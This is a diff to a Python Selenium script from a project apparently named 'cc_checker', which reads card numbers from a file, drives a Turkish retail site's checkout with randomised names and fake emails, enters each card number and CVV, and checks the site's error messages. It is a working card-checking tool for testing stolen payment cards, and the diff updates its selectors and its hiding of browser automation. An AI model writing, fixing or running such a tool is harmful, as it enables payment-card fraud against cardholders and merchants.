@@ -13,16 +13,15 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.select import Select
 from selenium.webdriver.support.ui import Select
 import random
-import string
-import random
 import re
 import string
-
+import uuid
+myuuid = uuid.uuid4()
 
 from time import sleep
 
 def funct():
-    CCList = open('cc.txt', "r+", encoding="utf8").read().splitlines()
+    CCList = open('C:\\Users\\krowzy\Desktop\\cc_checker-main\\cc.txt', "r+", encoding="utf8").read().splitlines()
     kartlar = []
 
     for i in CCList:
@@ -37,17 +36,39 @@ letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
 def random_char(char_num):
        return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))
 
-options = webdriver.ChromeOptions()
 
-options.add_experimental_option("useAutomationExtension", False)  # Adding Argument to Not Use Automation Extension
+#mobile_emulation = {
+
+ #  "deviceMetrics": { "width": 420, "height": 720, "pixelRatio": 3.0 },
+
+#   "userAgent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36" }
+options = webdriver.ChromeOptions()
 options.add_experimental_option("excludeSwitches", ["enable-automation"])  # Excluding enable-automation Switch
 options.add_argument("disable-popup-blocking")
 options.add_argument("disable-notifications")
+
+#################### EDİT HERE########################
+options.add_argument("user-data-dir=C:\\Users\\user\\Desktop\\cc_checker-main\\")
+################################################################################################
+
 options.add_argument("disable-gpu")
-chromedriver_autoinstaller.install()
-driver = webdriver.Chrome(options=options)
-driver.set_window_size(414, 896)
-user_agent =" Mozilla/5.1 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1"
+
+#chromedriver_autoinstaller.install()
+
+#options.add_experimental_option("mobileEmulation", mobile_emulation)
+
+
+#################### EDİT HERE########################
+driver = webdriver.Chrome(executable_path=r"C:\\Users\\user\\Desktop\\cc_checker-main\\chromedriver.exe",options=options)
+################################################################################################
+
+
+
+
+
+#driver = webdriver.Chrome(options=options)
+driver.set_window_size(500, 750)
+user_agent ="Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36s"
 wait = WebDriverWait(driver, 26, poll_frequency=1)
 print('Starting ..')
 driver.delete_all_cookies()
@@ -59,7 +80,7 @@ while True:
         #Purchased product link here  , change it if the product is out of stock
         driver.get(buy)
         sleep(4)
-        try: driver.find_element(By.XPATH, "//*[@id='onetrust-close-btn-container']/button").click()
+        try: driver.find_element(By.ID, "onetrust-accept-btn-handler").click()
         except:
             print('cookie button click')
             pass
@@ -83,14 +104,16 @@ while True:
         ).click()
         wait.until(
              EC.presence_of_element_located((By.XPATH,'//*[@id="summary-wrapper"]/div/div[2]/div/cta-checkout/div/div/div[2]/div/button'))).click()
-        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#store-search'))).send_keys('adana')
+        #wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#store-search'))).send_keys('adana')
         sleep(1)
-        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'button.inverse:nth-child(2)'))).click()
-        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'bsk-store-address.stores-address-container:nth-child(1) > div:nth-child(1)'))).click()
+        #wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="itxCheckoutPage"]/body/div[22]/div[1]/span[3]'))).click()
+        wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="searchStoresForm"]/div/div/button'))).click()
+        wait.until(EC.presence_of_element_located((By.XPATH, "//*[@id='searchModalResults']/div[2]/bsk-store-address[1]/div/div[1]"))).click()
         wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div"))).click()
         wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input"))).send_keys(random_char(5))
         wait.until(EC.presence_of_element_located((By.XPATH,"//*[@id='billingForm']/ul/li[2]/div/input"))).click()
         wait.until(EC.presence_of_element_located((By.XPATH,"/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input"))).send_keys(random_char(5))
+        sleep(0.3)
         wait.until(EC.presence_of_element_located((By.XPATH,"//*[@id='billingForm']/ul/li[3]/email-field/ng-form/ul/li/div/div/input"))).click()
         wait.until(EC.presence_of_element_located((By.XPATH,"//*[@id='billingForm']/ul/li[3]/email-field/ng-form/ul/li/div/div/input"))).send_keys(random_char(5)+"@mail.com")
         wait.until(EC.presence_of_element_located((By.XPATH,"//*[@id='billingForm']/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input"))).click()
@@ -143,23 +166,24 @@ while True:
             wait.until(
             EC.presence_of_element_located((By.NAME, "cvv2"))
             ).send_keys(cvv)
-            wait.until(
-            EC.presence_of_element_located((By.NAME, "holder"))
-            ).clear()
-            driver.find_element_by_name("holder").send_keys("ali"+random_char(5)) 
+            #wait.until(
+            #EC.presence_of_element_located((By.NAME, "holder"))
+            #).clear()
+            #sleep(1)
+	         
+            #driver.find_element(By.NAME, "holder").send_keys("sdfsdfsdf sdfsd fsdf sdf")
             try:
-                sleep(1)
                 dropdown = driver.find_element(By.NAME, "paymentModeId")
             except:continue
             dropdown = driver.find_element(By.NAME, "paymentModeId")
             try:
                 dropdown.find_element(By.XPATH, "//option[. = 'Tek Çekim Ödeme']").click()
             except: continue    
-            x=driver.find_element_by_name("number").is_displayed()
+            #x=driver.find_element_by_name("number").is_displayed()
             if tikli == False:
-               driver.find_element_by_name("privacyPolicy").click()
+               driver.find_element(By.XPATH, ("//*[@id='summary-wrapper']/div/div[2]/cta-checkout/div/ng-transclude/div/div/div[1]/input")).click()
             tikli = True
-            driver.find_element_by_css_selector(".ellipsis").click()
+            driver.find_element(By.XPATH, ("//*[@id='summary-wrapper']/div/div[2]/cta-checkout/div/div/div[2]/div/button")).click()
             driver.execute_script("window.scrollTo(0,0)")
             sleep(2)            
             hata2 = ('Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.')
